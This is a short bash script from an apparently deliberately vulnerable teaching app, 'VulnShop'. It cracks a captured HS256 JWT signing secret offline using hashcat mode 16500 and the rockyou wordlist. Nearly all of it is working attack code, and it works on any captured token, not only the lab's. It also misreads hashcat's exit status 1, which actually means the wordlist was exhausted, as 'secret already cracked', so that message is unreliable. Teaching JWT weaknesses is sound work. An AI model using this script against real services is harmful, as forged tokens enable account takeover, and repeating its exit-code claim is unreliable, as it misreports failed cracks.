#!/usr/bin/env bash
# crack_jwt.sh — Offline crack of an HS256 JWT signing secret with hashcat.
#
# Demonstrates A04:2025 — Cryptographic Failures. Even without access to the
# /api/debug/config endpoint, any captured token can have its secret recovered
# offline in seconds because VulnShop's SECRET_KEY is the dictionary word
# "secret" (see backend/main.py line 49).
#
# Usage:
#   1. Log in to VulnShop and copy the JWT from the login response.
#   2. ./crack_jwt.sh "eyJhbGci..."   (the full three-segment token)
#
# Tool reference:
#   hashcat -m 16500    JWT (JSON Web Token) HMAC-SHA256
#   Wordlist            rockyou.txt is the de-facto standard for HS256 cracking
#
# On Kali Linux / macOS with brew, hashcat and rockyou.txt are already present.

set -euo pipefail

if [[ $# -ne 1 ]]; then
  echo "usage: $0 '<jwt-string>'" >&2
  exit 1
fi

JWT="$1"
WORDLIST="${WORDLIST:-/usr/share/wordlists/rockyou.txt}"

if [[ ! -f "$WORDLIST" ]]; then
  echo "[!] Wordlist not found at $WORDLIST" >&2
  echo "    Override with: WORDLIST=/path/to/rockyou.txt $0 '<jwt>'" >&2
  exit 2
fi

echo "[*] Cracking HS256 secret for token (prefix: ${JWT:0:24}…)"
echo "[*] Wordlist: $WORDLIST"
echo

# -m 16500 = JWT (HS256)
# -a 0     = straight wordlist attack
# --quiet  = clean output
hashcat -m 16500 -a 0 --quiet "$JWT" "$WORDLIST" || {
  status=$?
  if [[ $status -eq 1 ]]; then
    echo
    echo "[+] Hashcat exit code 1 — secret already cracked in a previous run."
    echo "    Run:  hashcat -m 16500 '$JWT' --show"
  else
    echo "[!] hashcat failed (exit $status)" >&2
    exit $status
  fi
}

echo
echo "[+] Done. The line above ending in ':<secret>' is the recovered key."
echo "    For VulnShop the expected output is 'secret'."
